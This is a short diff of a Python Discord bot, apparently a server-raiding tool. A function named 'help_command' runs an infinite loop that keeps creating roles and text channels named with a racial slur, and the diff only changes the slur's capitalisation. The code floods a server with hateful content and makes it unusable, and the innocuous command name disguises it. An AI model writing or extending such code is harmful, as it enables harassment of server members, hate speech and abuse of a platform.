@@ -64,7 +64,7 @@ async def help_command(ctx):
     
     # Create new roles repeatedly from a list
     while True:  # This will create an infinite loop
-        await ctx.guild.create_role(name="niggeR")
+        await ctx.guild.create_role(name="NIGGER")
         await asyncio.sleep(0.55)
         hannel = await ctx.guild.create_text_channel("niggeR")
         await asyncio.sleep(0.55)
